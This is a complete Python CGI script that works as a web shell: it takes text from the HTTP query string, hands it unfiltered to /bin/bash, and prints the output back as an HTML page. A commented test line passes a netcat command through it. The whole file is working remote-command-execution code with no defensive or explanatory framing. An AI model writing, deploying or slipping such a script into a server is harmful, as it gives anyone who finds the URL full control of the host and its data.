#!/usr/bin/python
import cgitb; cgitb.enable()

# The subprocess module is new in 2.4
import os, urllib, subprocess as sub

# Retrieve the command from the query string
# and unencode the escaped %xx chars
str_command = urllib.unquote(os.environ['QUERY_STRING'])
#str_command = "nc localhost 5555=eren c :)"
a = str_command.split("=")[0]
b = str_command.split("=")[1]
commands = '''
%s
%s
''' % (a, b)

process = sub.Popen('/bin/bash', stdin=sub.PIPE, stdout=sub.PIPE, shell=True)
out, err = process.communicate(commands)

print """\
Content-Type: text/html\n
<html><body>
<pre>
$ %s
%s
</pre>
</body></html>
""" % (b, out)